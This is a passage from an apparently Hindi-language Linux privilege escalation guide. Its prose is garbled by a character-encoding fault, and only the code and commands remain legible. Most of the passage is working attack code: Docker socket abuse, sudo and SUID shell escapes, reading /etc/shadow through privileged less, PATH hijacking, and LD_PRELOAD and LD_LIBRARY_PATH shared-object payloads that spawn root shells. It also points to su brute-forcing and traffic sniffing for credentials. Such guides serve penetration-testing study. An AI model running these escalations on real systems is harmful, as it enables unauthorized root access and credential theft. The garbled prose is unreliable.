socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` рдХрдиреЗрдХреНрд╢рди рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рд╣реЛрд╕реНрдЯ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдЯ рд╕реНрддрд░ рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╕реАрдзреЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**рдпрд╣рд╛рдБ рдПрдХ D-Bus рд╕рдВрдЪрд╛рд░ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рдЙрд╕рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░реЗрдВ рд╕реАрдЦреЗрдВ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **рдиреЗрдЯрд╡рд░реНрдХ**

рдорд╢реАрди рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдВрдЪрдирд╛ рд╣рдореЗрд╢рд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдВрдЪ
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕

рд╣рдореЗрд╢рд╛ рдорд╢реАрди рдкрд░ рдЪрд▓ рд░рд╣реА рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдЬрд┐рдирд╕реЗ рдЖрдк рдкрд╣рд▓реЗ рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдереЗ:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкрдХрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
```
timeout 1 tcpdump
```
## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

### рд╕рд╛рдорд╛рдиреНрдп рдЧрдгрдирд╛

рдЬрд╛рдВрдЪреЗрдВ **рдХрд┐** рдЖрдк рдХреМрди рд╣реИрдВ, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реА **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ, рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреМрди **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ, рдХреМрди **рд▓реЙрдЧрд┐рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреМрдирдХреЗ рдкрд╛рд╕ **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### рдмрдбрд╝рд╛ UID

рдХреБрдЫ рд▓рд┐рдирдХреНрд╕ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдПрдХ рдмрдЧ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **UID > INT\_MAX** рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдореЗрдВ рд╡реГрджреНрдзрд┐ рджреЗрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [рдпрд╣рд╛рдБ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [рдпрд╣рд╛рдБ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) рдФрд░ [рдпрд╣рд╛рдБ](https://twitter.com/paragonsec/status/1071152249529884674)ред\
**рдЗрд╕реЗ рд╢рд╛рддрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: **`systemd-run -t /bin/bash`**

### рд╕рдореВрд╣

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп** рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рднреА рджрд┐рд▓рдЪрд╕реНрдк рд╡рд╕реНрддреБ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### рдЬреНрдЮрд╛рдд рдкрд╛рд╕рд╡рд░реНрдб

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рд╡рд░рдг рдХрд╛ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ** рддреЛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдЙрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

### Su Brute

рдпрджрд┐ рдЖрдкрдХреЛ рдЬреНрдпрд╛рджрд╛ рд╢реЛрд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рд╣реИ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ `su` рдФрд░ `timeout` рдмрд╛рдЗрдирд░реА рдореМрдЬреВрдж рд╣реИрдВ, рддреЛ рдЖрдк [su-bruteforce](https://github.com/carlospolop/su-bruteforce) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) рдХреЗ рд╕рд╛рде `-a` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

## рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп PATH рджреБрд░реБрдкрдпреЛрдЧ

### $PATH

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк **$PATH рдХреЗ рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рдПрдХ рдмреИрдХрдбреЛрд░ рдмрдирд╛рдХрд░ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдХрд┐рд╕реА рдРрд╕реЗ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд░реВрдЯ) рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдерд┐рдд рдирд╣реАрдВ рд╣реИ $PATH рдореЗрдВред

### SUDO рдФрд░ SUID

рдЖрдкрдХреЛ рд╕реБрдбреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИ рдпрд╛ рдЙрдирдХреЗ рдкрд╛рд╕ рд╕реБрдЗрдб рдмрд┐рдЯ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдпрд╛ рд▓рд┐рдЦрдиреЗ рдпрд╛ рдлрд┐рд░ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

рд╕реБрдбреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рди рдХрд░рддреЗ рд╣реБрдП рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИред
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `demo` `root` рдХреЗ рд░реВрдк рдореЗрдВ `vim` рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдм рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝рдХрд░ рдпрд╛ `sh` рдмреБрд▓рд╛рдХрд░ рдПрдХ рд╢реИрд▓ рдорд┐рд▓рдирд╛ рд╕рд░рд▓ рд╣реИред
```
sudo vim -c '!sh'
```
### SETENV

рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рдЪреАрдЬ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рддреЗ рд╕рдордп **рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░** рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
рдпрд╣ рдЙрджрд╛рд╣рд░рдг, **HTB рдорд╢реАрди Admirer рдкрд░ рдЖрдзрд╛рд░рд┐рдд**, **PYTHONPATH рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ** рдХреЗ рд▓рд┐рдП **рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХ** рдерд╛ рдЬрдмрдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рдерд╛:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo рдХрд╛рд░реНрд░рд╡рд╛рдИ рдкрдереЛрдВ рдХреЛ рдЫрд▓рдХрд░рдирд╛

**рдЬрдВрдк** рдХрд░реЗрдВ рдФрд░ рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реЗрдВ рдпрд╛ **рд╕рд┐рдорд▓рд┐рдВрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП sudoers рдлрд╝рд╛рдЗрд▓ рдореЗрдВ: _hacker10 рд╕рднреА= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
рдпрджрд┐ рдПрдХ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (\*), рддреЛ рдпрд╣ рдФрд░ рднреА рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**рдХрд╛рдЙрдВрдЯрд░рдореЗрдЬрд╝рд░реНрд╕**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo рдХрдорд╛рдВрдб/SUID рдмрд╛рдЗрдирд░реА рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдкрде рдХреЗ

рдпрджрд┐ **рд╕реБрдбреЛ рдЕрдиреБрдорддрд┐** рдХрд┐рд╕реА рдПрдХ рдХрдорд╛рдВрдб рдХреЛ **рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдмрд┐рдирд╛** рджреА рдЧрдИ рд╣реИ: _hacker10 ALL= (root) less_ рддреЛ рдЖрдк PATH рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдмрджрд▓рдХрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
рдпрд╣ рддрдХрдиреАрдХ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЕрдЧрд░ рдПрдХ **suid** рдмрд╛рдЗрдирд░реА **рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдПрдХ рдФрд░ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ (рд╣рдореЗрд╢рд╛** _**strings**_ **рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪреЗрдВ рдПрдХ рдЕрдЬреАрдм SUID рдмрд╛рдЗрдирд░реА рдХреА рд╕рд╛рдордЧреНрд░реА)**ред

[рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдЙрджрд╛рд╣рд░рдгред](payloads-to-execute.md)

### SUID рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдХрдорд╛рдВрдб рдкрде

рдЕрдЧрд░ **suid** рдмрд╛рдЗрдирд░реА **рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдФрд░ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ**, рддреЛ рдЖрдкрдХреЛ рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП **рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрдорд┐рдд рдХрд░рдиреЗ** рдХреА рдЬрд┐рд╕реЗ рдЙрд╕ рдХрдорд╛рдВрдб рдХреЗ рд░реВрдк рдореЗрдВ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ suid рдлрд╝рд╛рдЗрд▓ рдмреБрд▓рд╛рддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдПрдХ suid рдмрд╛рдЗрдирд░реА _**/usr/sbin/service apache2 start**_ рдХреЛ рдмреБрд▓рд╛рддреА рд╣реИ рддреЛ рдЖрдкрдХреЛ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмрдирд╛рдиреЗ рдФрд░ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ (.so рдлрд╝рд╛рдЗрд▓реЗрдВ) рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд▓реЛрдбрд░ рджреНрд╡рд╛рд░рд╛ рд╕рднреА рдЕрдиреНрдп, рд╕реНрдЯреИрдВрдбрд░реНрдб рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп (`libc.so`) рд╕рд╣рд┐рдд, рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХреА рдЬрд╛рдПрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдкреВрд░реНрд╡-рд▓реЛрдб рдХрд░рдирд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд┐рд╕реНрдЯрдо рд╕реБрд░рдХреНрд╖рд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рд╢реЛрд╖рдг рди рд╣реЛрдиреЗ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **suid/sgid** рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рд╕рд╛рде, рд╕рд┐рд╕реНрдЯрдо рдирд┐рд╢реНрдЪрд┐рдд рд╢рд░реНрддреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ:

* рд▓реЛрдбрд░ **LD\_PRELOAD** рдХреЛ рдЙрди рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рд▓рд┐рдП рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА (_ruid_) рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреА рд╣реИ рдЗрдлреЗрдХреНрдЯрд┐рд╡ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА (_euid_) рд╕реЗред
* suid/sgid рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рд▓рд┐рдП, рдХреЗрд╡рд▓ рдорд╛рдирдХ рдкрдереЛрдВ рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ рдкреВрд░реНрд╡-рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИрдВ рдЬреЛ рд╕реБрдИрдб/рдПрд╕рдЬреАрдЖрдИрдбреА рднреА рд╣реИрдВред

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `sudo` рдХреЗ рд╕рд╛рде рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ рдФрд░ `sudo -l` рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╡рд╛рдХреНрдп **env\_keep+=LD\_PRELOAD** рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣ рд╡рд┐рдиреНрдпрд╛рд╕ **LD\_PRELOAD** рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЕрдирд┐рд╡рд╛рд░реНрдп рд░реВрдк рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЕрд░реНрдмрд┐рдЯреНрд░реЗ рдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдиреЗ рдореЗрдВ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
Defaults        env_keep += LD_PRELOAD
```
рд╕рд╣реЗрдЬреЗрдВ рдЬреИрд╕реЗ **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
рдлрд┐рд░ **рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ** рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
рдЕрдВрдд рдореЗрдВ, **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдПрдВ** рдЪрд▓ рд░рд╣рд╛ рд╣реИ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
рдПрдХ рд╕рдорд╛рди privesc рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд╛рд░ **LD\_LIBRARY\_PATH** env variable рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╡рд╣ рдкрде рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреАред
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID рдмрд╛рдЗрдирд░реА - .so рдЗрдВрдЬреЗрдХреНрд╢рди

